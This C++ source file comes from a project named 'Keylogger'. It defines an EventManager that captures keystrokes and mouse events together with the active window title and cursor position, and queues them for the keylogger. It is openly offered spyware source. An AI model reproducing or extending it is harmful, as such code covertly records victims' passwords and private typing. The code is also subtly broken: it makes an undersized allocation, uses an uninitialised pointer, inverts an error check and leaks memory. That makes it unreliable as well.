/**
 * Project Keylogger
 */
#include				"keylogger_dll/EventManager.h"
#include				"keylogger_dll\Keylogger.h"

/**
 * @param Keylogger&
 */
EventManager::EventManager(Keylogger& keylogger) : _keylogger(keylogger) {
}

EventManager::~EventManager()
{
}

/**
 * Call the Event Factory to create a keyboard event depending on parameters. 
 * @param LPARAM
 * @param WPARAM
 * @return void
 */
void					EventManager::handleKeyboardEvent(const WPARAM wParam, const LPARAM lParam) const{
	
	if (wParam == WM_KEYDOWN)
	{ 
		const AEvent* event = EventFactory::createKeyboardEvent(wParam, lParam, *updateContext());
		_keylogger.pushToQueue(event);
	}
    return;
}

/**
* Call the Event Factory to create a mouse event depending on parameters.
* @param LPARAM
* @param WPARAM
* @return void
*/
void					EventManager::handleMouseEvent(const WPARAM wParam, const LPARAM lParam) const {
	const AEvent* event = EventFactory::createMouseEvent(wParam, lParam, *updateContext());
	_keylogger.pushToQueue(event);
	return;
}

/** 
* Update the context
* returns false if error happened.
*/
const t_Context			*EventManager::updateContext() const
{
	int					length;
	HWND				window;
	t_Context			*context;

	if ((context = (t_Context*)malloc(sizeof(t_Context*))) == NULL)
		return NULL;
	if (GetCursorPos(context->_mousePos))
		return NULL;
	if ((window = GetForegroundWindow()) == NULL)
		return NULL;
	if ((length = GetWindowTextLength(window) + 1) == 1)
		return NULL;
	char *str;
	if ((str = (char*)malloc(length)) == NULL)
		return NULL;
	if (GetWindowText(window, str, length) == 0)
		return NULL;
	context->_windowTitle = str;
	return context;
}